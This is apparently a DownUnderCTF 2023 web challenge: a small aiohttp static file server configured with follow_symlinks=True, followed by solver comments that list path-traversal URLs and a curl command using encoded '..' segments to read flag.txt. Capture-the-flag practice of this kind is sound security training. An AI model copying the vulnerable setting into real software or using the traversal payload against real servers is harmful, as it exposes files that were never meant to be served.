from aiohttp import web


async def index(request):
    return web.Response(
        body="""
        <header><h1>static file server</h1></header>
        Here are some files:
        <ul>
            <li><img src="/files/ductf.png"></img></li>
            <li><a href="/files/not_the_flag.txt">not the flag</a></li>
        </ul>
    """,
        content_type="text/html",
        status=200,
    )


app = web.Application()
app.add_routes(
    [
        web.get("/", index),
        # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690
        web.static("/files", "./files", follow_symlinks=True),
    ]
)
web.run_app(app)

# https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt
# https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt/../not_the_flag.txt

# https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt/../../flag.txt

# https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt/../../../flag.txt

# curl 'https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt/%2E%2E/%2E%2E/%2E%2E/flag.txt'
